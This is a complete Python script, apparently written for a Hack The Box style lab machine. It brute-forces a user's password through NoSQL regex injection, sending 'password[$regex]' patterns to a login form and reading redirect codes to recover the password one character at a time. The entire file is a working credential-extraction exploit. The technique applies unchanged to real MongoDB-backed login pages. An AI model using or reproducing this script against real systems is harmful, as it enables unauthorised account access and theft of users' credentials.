import string
import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python brute.py <USERNAME>")
    quit()

chars = string.ascii_letters + string.digits + string.punctuation
username = sys.argv[1] 
password = ""
running = True

while running:
 for char in chars:
  if char in ["*", "+", ".", "?", "|", "\\"]:
   continue
  sys.stdout.write(f"\rtrying {char} | password: {password}")
  sys.stdout.flush()
  response = requests.post("http://staging-order.mango.htb",data={"username":username,"password[$regex]":f"^{password}{char}.*","login":"login"},allow_redirects=False)
  if response.status_code in (302,301):
   password+=char
   sys.stdout.write(f"\r{' ' * 50}\r")
   sys.stdout.write(f"\rtrying {char} | password: {password}")
   sys.stdout.flush()
  verify = requests.post("http://staging-order.mango.htb",data={"username":username,"password":f"{password}","login":"login"},allow_redirects=False)
  if verify.status_code in (302,301):
   print("password is: "+password)
   running = False
   break
